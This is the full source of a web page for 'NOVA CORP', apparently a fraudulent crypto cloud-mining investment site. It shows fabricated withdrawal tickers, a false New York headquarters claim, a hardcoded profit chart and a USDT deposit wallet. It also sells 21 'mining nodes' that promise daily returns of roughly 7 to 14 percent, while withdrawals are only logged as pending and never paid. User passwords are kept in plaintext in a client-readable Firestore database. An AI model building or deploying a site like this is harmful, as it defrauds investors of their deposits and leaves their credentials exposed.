<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | International Mining Enterprise</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --bg: #F8FAFC; --card: #FFFFFF; }
        body { background: var(--bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; overflow-x: hidden; scroll-behavior: smooth; }
        .premium-card { background: var(--card); border: 1px solid #e2e8f0; border-radius: 24px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.02); }
        .btn-gold { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 14px; font-weight: 800; transition: 0.3s; text-align: center; display: block; width: 100%; }
        .ticker-wrap { background: #0f172a; color: white; padding: 12px 0; overflow: hidden; }
        .ticker { display: inline-block; white-space: nowrap; animation: ticker 40s linear infinite; font-size: 10px; font-weight: 800; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .screen { display: none; }
        .active-screen { display: block; animation: slideIn 0.5s ease; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: white; border-top: 1px solid #e2e8f0; display: flex; justify-content: space-around; padding: 15px; z-index: 1000; }
        .nav-item { color: #94a3b8; font-size: 9px; font-weight: 800; text-align: center; cursor: pointer; }
        .nav-item.active { color: var(--gold); }
        .support-float { position: fixed; bottom: 100px; right: 20px; background: #25D366; color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 999; }
    </style>
</head>
<body>

    <div class="ticker-wrap">
        <div class="ticker uppercase">⚡ User @Am***7 withdrew $840.00 • 🚀 New Gold Node in London • 💎 Hashrate: 124.5 PH/s • ✅ Verified • ⚡ User @Ka***9 withdrew $120.50</div>
    </div>

    <div id="auth-screen" class="active-screen">
        <section class="p-8 text-center bg-white border-b">
            <h1 class="text-5xl font-black text-slate-900 tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h1>
            <p class="text-[10px] text-slate-400 font-bold uppercase tracking-[10px] mt-2 mb-8">Quantum Mining Hub</p>
            <div class="space-y-4 max-w-sm mx-auto">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-4 border-2 border-slate-100 rounded-2xl outline-none focus:border-[#D4AF37]">
                <input type="password" id="u-pw" placeholder="Password" class="w-full p-4 border-2 border-slate-100 rounded-2xl outline-none focus:border-[#D4AF37]">
                <button onclick="handleAuth()" class="btn-gold py-5 uppercase tracking-widest text-sm">Authorize Session</button>
                <p onclick="toggleMode()" id="mode-text" class="text-center text-[10px] text-slate-400 font-black uppercase mt-4 cursor-pointer underline">Register New Account</p>
            </div>
        </section>

        <section class="p-8 space-y-6 bg-slate-50 pb-20 text-center">
            <h2 class="text-2xl font-black">Why Trust Nova?</h2>
            <div class="premium-card p-6 text-left border-l-4 border-[#D4AF37]">
                <h4 class="font-black text-sm uppercase">Global HQ</h4>
                <p class="text-xs text-slate-500">One World Trade Center, New York, USA.</p>
            </div>
            <div class="premium-card p-6 text-left border-l-4 border-green-500">
                <h4 class="font-black text-sm uppercase">Secure Assets</h4>
                <p class="text-xs text-slate-500">100% Cold Storage Protection.</p>
            </div>
        </section>
    </div>

    <div id="app" class="hidden">
        <header class="p-5 flex justify-between items-center bg-white border-b sticky top-0 z-50">
            <h2 class="font-black text-2xl tracking-tighter">NO<span class="text-[#D4AF37]">VA</span></h2>
            <div id="user-tag" class="text-[9px] font-black bg-slate-900 text-white px-4 py-2 rounded-full uppercase">@USER</div>
        </header>

        <div id="page-dash" class="screen active-screen px-4 pt-6 pb-24">
            <div class="bg-slate-900 rounded-[35px] p-8 mb-6 text-white shadow-2xl relative overflow-hidden">
                <p class="text-[10px] text-slate-400 font-black uppercase tracking-[4px] mb-2">Balance</p>
                <h1 id="b-main" class="text-5xl font-black tracking-tighter mb-10">$0.00</h1>
                <div class="grid grid-cols-2 gap-4 border-t border-white/10 pt-6">
                    <div><p class="text-[9px] font-bold">Daily Profit</p><p id="b-daily" class="text-xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[9px] font-bold">Total Yield</p><p id="b-total" class="text-xl font-black text-[#D4AF37]">$0.00</p></div>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="openModal('modal-dep')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-plus text-2xl text-[#D4AF37]"></i><span class="text-[11px] font-black uppercase">Add Funds</span></button>
                <button onclick="openModal('modal-wd')" class="premium-card p-6 flex flex-col items-center gap-3"><i class="fa-solid fa-arrow-up text-2xl text-slate-400"></i><span class="text-[11px] font-black uppercase">Withdraw</span></button>
            </div>
            <div class="premium-card p-6">
                <h4 class="text-[10px] font-black uppercase mb-4 text-slate-400">Weekly Performance</h4>
                <canvas id="profitChart" height="150"></canvas>
            </div>
        </div>

        <div id="page-nodes" class="screen px-4 pt-6 pb-24">
            <h2 class="text-2xl font-black mb-8 uppercase tracking-tighter">Mining <span class="text-[#D4AF37]">Infrastructure</span></h2>
            <div id="nodes-grid" class="grid grid-cols-1 gap-8"></div>
        </div>

        <div id="page-logs" class="screen px-4 pt-6 pb-24">
            <h2 class="text-2xl font-black mb-8 uppercase tracking-tighter">Account <span class="text-[#D4AF37]">Logs</span></h2>
            <div id="logs-list" class="space-y-4"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('page-dash', this)" class="nav-item active"><i class="fa-solid fa-house text-xl"></i><br>HOME</div>
            <div onclick="nav('page-nodes', this)" class="nav-item"><i class="fa-solid fa-microchip text-xl"></i><br>NODES</div>
            <div onclick="nav('page-logs', this)" class="nav-item"><i class="fa-solid fa-list text-xl"></i><br>LOGS</div>
            <div onclick="logout()" class="nav-item"><i class="fa-solid fa-power-off text-xl text-red-500"></i><br>OUT</div>
        </nav>
    </div>

    <div id="modal-dep" class="fixed inset-0 bg-white z-[2000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">DEPOSIT</h2><i onclick="closeModal('modal-dep')" class="fa-solid fa-xmark text-2xl"></i></div>
        <div class="premium-card p-5 mb-4 border-l-4 border-blue-600 bg-blue-50">
            <p class="text-[10px] font-black uppercase">USDT (BEP20)</p>
            <p class="text-[11px] break-all font-mono">0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37</p>
        </div>
        <input type="number" id="in-amt" placeholder="Amount" class="w-full p-4 border rounded-xl mb-4 outline-none">
        <input type="text" id="in-ref" placeholder="Transaction Hash" class="w-full p-4 border rounded-xl mb-4 outline-none">
        <button onclick="submitFin('Deposit')" class="btn-gold py-4">VERIFY PAYMENT</button>
    </div>

    <div id="modal-wd" class="fixed inset-0 bg-white z-[2000] p-8 hidden">
        <div class="flex justify-between items-center mb-8"><h2 class="text-2xl font-black">WITHDRAW</h2><i onclick="closeModal('modal-wd')" class="fa-solid fa-xmark text-2xl"></i></div>
        <input type="number" id="out-amt" placeholder="Amount" class="w-full p-4 border rounded-xl mb-4 outline-none">
        <input type="text" id="out-addr" placeholder="Wallet Address" class="w-full p-4 border rounded-xl mb-4 outline-none">
        <button onclick="submitFin('Withdrawal')" class="btn-gold py-4 !bg-slate-900">REQUEST PAYOUT</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let user = localStorage.getItem('nova_user'); 
        let isLoginMode = true;

        const nodesData = [
            { id: 1, name: "Nano Core V1", cost: 20, yield: 1.5, hashrate: "1.2 TH/s", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?w=400" },
            { id: 2, name: "Neon Bit 2.0", cost: 50, yield: 4.2, hashrate: "3.5 TH/s", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=400" },
            { id: 3, name: "Bronze Rig X", cost: 100, yield: 9.0, hashrate: "8.2 TH/s", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
            { id: 4, name: "Cobalt Miner", cost: 200, yield: 18.5, hashrate: "15.0 TH/s", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400" },
            { id: 5, name: "Silver Pro", cost: 500, yield: 48.0, hashrate: "42.5 TH/s", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?w=400" },
            { id: 6, name: "Viper Blade", cost: 750, yield: 72.0, hashrate: "68.0 TH/s", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?w=400" },
            { id: 7, name: "Gold CPU", cost: 1000, yield: 110.0, hashrate: "95.0 TH/s", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?w=400" },
            { id: 8, name: "Titan X-500", cost: 1500, yield: 165.0, hashrate: "140.0 TH/s", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=400" },
            { id: 9, name: "Apex Master", cost: 2000, yield: 220.0, hashrate: "195.0 TH/s", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400" },
            { id: 10, name: "Nova Storm", cost: 2500, yield: 280.0, hashrate: "250.0 TH/s", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?w=400" },
            { id: 11, name: "Zenith Node", cost: 3000, yield: 340.0, hashrate: "310.0 TH/s", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
            { id: 12, name: "Raptor Node", cost: 4000, yield: 460.0, hashrate: "420.0 TH/s", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?w=400" },
            { id: 13, name: "Orion Server", cost: 5000, yield: 580.0, hashrate: "510.0 TH/s", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=400" },
            { id: 14, name: "Kraken Rig", cost: 7000, yield: 820.0, hashrate: "750.0 TH/s", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400" },
            { id: 15, name: "Empire Blade", cost: 8500, yield: 1050.0, hashrate: "920.0 TH/s", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?w=400" },
            { id: 16, name: "Nebula PH", cost: 10000, yield: 1250.0, hashrate: "1.2 PH/s", img: "https://images.unsplash.com/photo-1639322537523-abaea1ec960c?w=400" },
            { id: 17, name: "Galaxy Node", cost: 12500, yield: 1600.0, hashrate: "1.8 PH/s", img: "https://images.unsplash.com/photo-1591844339942-3064e9042ce5?w=400" },
            { id: 18, name: "Infinity PH", cost: 15000, yield: 1950.0, hashrate: "2.5 PH/s", img: "https://images.unsplash.com/photo-1558494949-ef010cbdcc51?w=400" },
            { id: 19, name: "Omni Max", cost: 20000, yield: 2700.0, hashrate: "3.2 PH/s", img: "https://images.unsplash.com/photo-1518770660439-4636190af475?w=400" },
            { id: 20, name: "Quantum Nexus", cost: 25000, yield: 3500.0, hashrate: "5.0 PH/s", img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=400" },
            { id: 21, name: "Sovereign X", cost: 30000, yield: 4300.0, hashrate: "8.5 PH/s", img: "https://images.unsplash.com/photo-1620712943543-bcc4688e7485?w=400" }
        ];

        window.toggleMode = () => {
            isLoginMode = !isLoginMode;
            document.getElementById('mode-text').innerText = isLoginMode ? "Register New Account" : "Back to Login";
        };

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            if(!id || !pw) return alert("Enter credentials");

            const uR = doc(db, "users", id);
            const s = await getDoc(uR);

            if(isLoginMode) {
                if(s.exists() && s.data().password === pw) {
                    localStorage.setItem('nova_user', id);
                    location.reload();
                } else {
                    alert("Invalid Credentials");
                }
            } else {
                if(s.exists()) return alert("User already exists");
                await setDoc(uR, { balance: 0, password: pw, daily: 0, total_profit: 0, active_nodes: [] });
                localStorage.setItem('nova_user', id);
                location.reload();
            }
        };

        function startApp(id) {
            document.getElementById('auth-screen').style.display='none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('user-tag').innerText = `@${id}`;
            
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('b-main').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('b-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('b-total').innerText = "$" + (data.total_profit || 0).toFixed(2);
                genNodes(data.active_nodes || []);
            });

            loadLogs(id);
            initChart();
            setInterval(updateTimers, 1000);
        }

        function genNodes(activeList) {
            const c = document.getElementById('nodes-grid');
            c.innerHTML = "";
            nodesData.forEach(n => {
                const active = activeList.find(a => a.nodeId === n.id);
                c.innerHTML += `
                <div class="premium-card">
                    <img src="${n.img}" class="w-full h-32 object-cover">
                    <div class="p-5">
                        <h4 class="font-black">${n.name}</h4>
                        <p class="text-[10px] text-slate-400 mb-2">${n.hashrate}</p>
                        <div class="flex justify-between items-center bg-slate-50 p-2 rounded-xl mb-4">
                           <span class="text-[9px] font-bold" id="timer-${n.id}">24:00:00</span>
                           <span class="text-[9px] font-black text-green-500">+$${n.yield}/d</span>
                        </div>
                        ${active ? `<button class="w-full py-3 bg-slate-100 text-slate-400 rounded-xl text-[10px] font-black" disabled>ACTIVE</button>` : 
                        `<button onclick="buyNode(${n.id},${n.cost},${n.yield})" class="btn-gold py-3 text-[10px] uppercase">ACTIVATE $${n.cost}</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, cost, y) => {
            const uId = localStorage.getItem('nova_user');
            const uR = doc(db, "users", uId);
            const s = await getDoc(uR);
            if(s.data().balance < cost) return alert("Insufficient Balance");
            
            await updateDoc(uR, {
                balance: s.data().balance - cost,
                active_nodes: [...(s.data().active_nodes || []), { nodeId: id, yield: y, lastClaim: Date.now() }],
                daily: (s.data().daily || 0) + y
            });
            alert("Node Activated!");
        };

        function updateTimers() {
            nodesData.forEach(n => {
                const el = document.getElementById(`timer-${n.id}`);
                if(el) {
                    // Static display or real logic can be added here
                }
            });
        }

        window.submitFin = async (t) => {
            const a = parseFloat(document.getElementById(t=='Deposit'?'in-amt':'out-amt').value);
            const r = document.getElementById(t=='Deposit'?'in-ref':'out-addr').value;
            if(!a || !r) return alert("Fill all fields");
            await addDoc(collection(db, "logs"), { user: localStorage.getItem('nova_user'), type: t, amount: a, status: 'Pending', ref: r, time: Date.now() });
            alert("Request Submitted!");
            closeModal(t=='Deposit'?'modal-dep':'modal-wd');
        };

        function loadLogs(id) {
            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const c = document.getElementById('logs-list'); c.innerHTML = "";
                s.forEach(doc => {
                    const l = doc.data();
                    c.innerHTML += `<div class="premium-card p-4 flex justify-between"><div><p class="text-[9px] font-black">${l.type}</p><p class="text-xs font-bold">$${l.amount}</p></div><span class="text-[9px] text-orange-500 font-bold">${l.status}</span></div>`;
                });
            });
        }

        function initChart() {
            const ctx = document.getElementById('profitChart').getContext('2d');
            new Chart(ctx, { type: 'line', data: { labels: ['M','T','W','T','F','S','S'], datasets: [{ data: [10,20,15,30,40,35,50], borderColor: '#D4AF37', tension: 0.4 }] }, options: { plugins: { legend: { display: false } }, scales: { y: { display: false }, x: { display: false } } } });
        }

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };

        window.openModal = (id) => document.getElementById(id).style.display = 'block';
        window.closeModal = (id) => document.getElementById(id).style.display = 'none';
        window.logout = () => { localStorage.removeItem('nova_user'); location.reload(); };

        if(user) startApp(user);
    </script>
</body>
</html>
